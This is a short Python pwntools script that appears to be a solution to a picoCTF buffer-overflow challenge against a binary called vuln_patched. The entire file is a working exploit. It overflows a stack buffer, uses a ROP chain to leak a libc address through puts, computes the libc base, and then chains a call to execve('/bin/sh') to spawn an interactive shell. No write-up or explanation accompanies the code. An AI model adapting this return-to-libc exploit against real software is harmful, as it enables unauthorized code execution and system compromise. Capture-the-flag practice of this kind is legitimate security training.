#!/usr/bin/env python
import pwn
import struct

io = pwn.process("./vuln_patched")
# io = pwn.remote("mercury.picoctf.net", 49464)
libc = pwn.ELF("./libc.so.6", checksec=False)
exe = pwn.ELF("./vuln_patched", checksec=False)
rop = pwn.ROP(exe)
pwn.context.binary = exe

one_gadget = 0x4F35E


def b(i):
    return i.to_bytes(8, "little")


offset = 136

rop.call("puts", [exe.got["puts"]])
rop.call("main")

payload = b""
payload += b"A" * offset
payload += rop.chain()

io.sendline(payload)
io.recvline()
io.recvline()

leak = io.recvline().rstrip()
leak = leak + b"\x00" * (8 - len(leak))
leak = struct.unpack("Q", leak)[0]

libc.address = leak - libc.sym["puts"]
print(hex(libc.address))

rop = pwn.ROP(libc)
rop.call("execve", [next(libc.search(b"/bin/sh\x00")), 0, 0])

payload = b""
payload += b"A" * offset
payload += rop.chain()

io.sendline(payload)
io.interactive()
